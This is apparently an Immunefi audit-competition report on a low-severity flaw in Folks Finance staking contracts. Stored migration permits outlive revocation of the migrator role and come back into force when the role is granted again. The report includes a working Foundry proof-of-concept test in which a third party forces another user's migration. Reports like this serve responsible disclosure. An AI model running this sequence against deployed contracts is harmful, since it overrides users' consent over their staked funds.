# 69330 sc low revoked migrators leave non revocable stale permits that reactivate on role re grant

**Submitted on Mar 14th 2026 at 08:40:46 UTC by @two for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69330
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/interfaces/IMigratorV1.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

`setMigrationPermit()` only allows a user to update consent for an address that currently holds `MIGRATOR_ROLE`. Because revoking the role does not clear stored approvals, a user who previously opted in cannot later revoke that approval while the migrator is disabled. If governance later re-grants `MIGRATOR_ROLE` to the same migrator address, the old approval becomes live again immediately. In the provided example implementation, `MigratorV1.migrate(user)` is permissionless, so any third party can force migration without renewed user consent.

## Vulnerability Details

The root cause is that migration consent is keyed only by migrator address and survives role revocation, while the revoke path is blocked by the current-role check.

The user-facing consent function is:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

Because of the `hasRole(MIGRATOR_ROLE, _migrator)` gate, once governance revokes the role from a migrator contract, users can no longer call `setMigrationPermit(migrator, false)` to clean up old approvals. However, the approval is still stored in:

```solidity
mapping(address migrator => mapping(address user => bool isAuthorized)) public migrationPermits;
```

Later, migration only checks:

1. The caller currently has `MIGRATOR_ROLE`.
2. The stored approval `migrationPermits[msg.sender][user]` is still `true`.

That check is implemented in:

```solidity
function migratePositionsFrom(address user)
    external
    nonReentrant
    onlyRole(MIGRATOR_ROLE)
    returns (UserStake[] memory)
{
    if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);
    ...
}
```

So the following sequence is possible:

1. Governance grants `MIGRATOR_ROLE` to migrator `A`.
2. Alice opts in with `setMigrationPermit(A, true)`.
3. Governance revokes `MIGRATOR_ROLE` from `A`.
4. Alice tries to revoke with `setMigrationPermit(A, false)` and the call reverts with `MigratorNotFound(A)`.
5. Governance later re-grants `MIGRATOR_ROLE` to the same address `A`.
6. `migrationPermits[A][alice]` is still `true`, so `A` can again migrate Alice’s positions.

The practical trigger is stronger because the provided example migrator is permissionless:

```solidity
function migrate(address user) external nonReentrant {
    IERC20 senderToken = FROM.TOKEN();
    IERC20 receiverToken = TO.TOKEN();
    if (address(senderToken) != address(receiverToken)) revert DifferentStakingTokens(senderToken, receiverToken);

    uint256 tokenBalanceBefore = senderToken.balanceOf(address(this));
    IStakingV1.UserStake[] memory userStakes = FROM.migratePositionsFrom(user);
    ...
}
```

There is no access control on `migrate(user)`, so after a role re-grant any external account can trigger the migration path on behalf of the user.

## Impact Details

Selected impact: `Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)`

This issue breaks the documented consent model for migration. A user can opt in, governance can revoke the migrator, and the user still cannot revoke that approval during the disabled period. If governance later reuses the same migrator address, the user is silently opted back in without taking any new action.

In the current codebase, the direct consequence is unauthorized forced migration rather than direct theft:

* The old staking contract will transfer the user’s remaining stake principal and reward entitlement to the migrator once `migratePositionsFrom(user)` succeeds.
* The example `MigratorV1` then forwards those assets and positions into the destination contract.
* Because `MigratorV1.migrate(user)` is externally callable by anyone, a third party can execute the migration as soon as the role is re-granted.

This is best classified as griefing because the user loses control over migration timing and consent state, even though the PoC does not require the attacker to profit directly or steal principal in the source contract.

## References

* `setMigrationPermit()` gate: <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77-L81>
* `migrationPermits` storage: <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L36-L39>
* `migratePositionsFrom()` authorization check: <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L166-L209>
* Permissionless example migrator entrypoint: <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/test/MigratorV1.sol#L44-L60>
* README statement that users can revoke permission "at any time": <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/README.md#L140>

## Proof of Concept

The following Foundry test demonstrates the full PoC sequence:

1. Alice stakes.
2. Alice permits the migrator.
3. Governance revokes the migrator role.
4. Alice cannot revoke her old approval anymore.
5. Governance re-grants the same migrator role.
6. A third party forces migration through the permissionless migrator.

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";
import {IMigratorV1} from "../src/interfaces/IMigratorV1.sol";
import {MigratorV1} from "../src/test/MigratorV1.sol";
import {StakingV2Mock} from "../src/test/mock/StakingV2Mock.sol";

contract MigrationPermitPoCToken is ERC20Permit {
    constructor() ERC20Permit("MigrationPermitPoCToken") ERC20("MigrationPermitPoCToken", "MPOC") {}
}

contract StaleMigrationPermitPoCTest is Test {
    bytes32 internal migratorRole;

    MigrationPermitPoCToken internal token;
    Staking internal staking;
    StakingV2Mock internal stakingV2;
    MigratorV1 internal migrator;

    address internal admin = address(0xA11CE);
    address internal manager = address(0xB0B);
    address internal pauser = address(0xCAFE);
    address internal alice = address(0xA71CE);
    address internal bob = address(0xBEEF);

    function setUp() public {
        token = new MigrationPermitPoCToken();
        staking = new Staking(admin, manager, pauser, address(token));
        stakingV2 = new StakingV2Mock(token);
        migrator = new MigratorV1(IMigratorV1(address(staking)), stakingV2);
        migratorRole = staking.MIGRATOR_ROLE();

        vm.prank(admin);
        staking.grantRole(migratorRole, address(migrator));

        deal(address(token), address(staking), 1_000 ether);
        deal(address(token), alice, 100 ether);
    }

    function test_PoC_RevokedMigratorPermitReactivatesOnRoleRegrant() public {
        uint8 periodIndex = _addStakingPeriod(100 ether, 30 days, 7 days, 5_000, true);
        _stake(alice, periodIndex, 10 ether, 30 days, 7 days, 5_000);

        IStakingV1.UserStake memory originalStake = staking.getUserStake(alice, 0);

        vm.prank(alice);
        staking.setMigrationPermit(address(migrator), true);
        assertTrue(staking.migrationPermits(address(migrator), alice));

        vm.prank(admin);
        staking.revokeRole(migratorRole, address(migrator));

        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, address(migrator)));
        vm.prank(alice);
        staking.setMigrationPermit(address(migrator), false);

        assertTrue(staking.migrationPermits(address(migrator), alice));

        vm.prank(admin);
        staking.grantRole(migratorRole, address(migrator));

        uint256 sourceBalanceBefore = token.balanceOf(address(staking));
        uint256 destinationBalanceBefore = token.balanceOf(address(stakingV2));

        vm.prank(bob);
        migrator.migrate(alice);

        uint256 migratedAmount = originalStake.amount + originalStake.reward;
        assertEq(token.balanceOf(address(staking)), sourceBalanceBefore - migratedAmount);
        assertEq(token.balanceOf(address(stakingV2)), destinationBalanceBefore + migratedAmount);
        assertEq(token.balanceOf(address(migrator)), 0);
        assertEq(staking.getUserStakes(alice).length, 0);
    }

    function _addStakingPeriod(
        uint256 cap,
        uint64 stakingDurationSeconds,
        uint64 unlockDurationSeconds,
        uint32 aprBps,
        bool isActive
    ) internal returns (uint8 periodIndex) {
        vm.prank(manager);
        periodIndex = staking.addStakingPeriod(cap, stakingDurationSeconds, unlockDurationSeconds, aprBps, isActive);
    }

    function _stake(
        address user,
        uint8 periodIndex,
        uint256 amount,
        uint64 maxStakingDurationSeconds,
        uint64 maxUnlockDurationSeconds,
        uint32 minAprBps
    ) internal returns (uint8 stakeIndex) {
        vm.startPrank(user);
        token.approve(address(staking), amount);
        stakeIndex = staking.stake(
            periodIndex,
            amount,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: maxStakingDurationSeconds,
                maxUnlockDurationSeconds: maxUnlockDurationSeconds,
                minAprBps: minAprBps,
                referrer: address(0)
            })
        );
        vm.stopPrank();
    }
}
```

Use forge to run the PoC:

```bash
~/.foundry/bin/forge test --match-test test_PoC_RevokedMigratorPermitReactivatesOnRoleRegrant -vv
```

Expected output:

```
Compiling 1 files with Solc 0.8.33
Solc 0.8.33 finished in 741.96ms
Compiler run successful!

Ran 1 test for test/StaleMigrationPermitPoC.t.sol:StaleMigrationPermitPoCTest
[PASS] test_PoC_RevokedMigratorPermitReactivatesOnRoleRegrant() (gas: 420200)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.90ms (496.54µs CPU time)

Ran 1 test suite in 13.29ms (3.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
